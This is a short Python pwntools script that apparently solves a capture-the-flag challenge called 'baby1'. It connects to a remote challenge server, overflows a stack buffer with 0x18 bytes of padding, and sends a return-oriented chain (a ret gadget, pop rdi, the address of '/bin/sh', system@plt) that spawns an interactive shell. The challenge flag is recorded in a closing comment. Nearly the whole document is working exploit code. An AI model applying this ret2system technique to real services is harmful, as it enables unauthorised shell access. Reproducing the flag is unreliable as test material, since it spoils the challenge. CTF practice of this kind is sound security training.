from pwn import *


binpath = './baby1'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']


elf = ELF(binpath)


gdbscript = '''
peda
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = remote('baby-01.pwn.beer', 10001)
# io = process(binpath)


addr_pop_rdi = 0x0000000000400793

payload = ''
payload += 'A' * 0x18
payload += p64(0x000000000040053e) # ret; to avoid SEGV
payload += p64(addr_pop_rdi)
payload += p64(next(elf.search('/bin/sh')))
payload += p64(elf.plt['system'])

io.sendline(payload)

io.interactive()


# sctf{1.p0p_r3GIs73rS_2.pOp_5H3lL_3.????_4.pr0FiT}
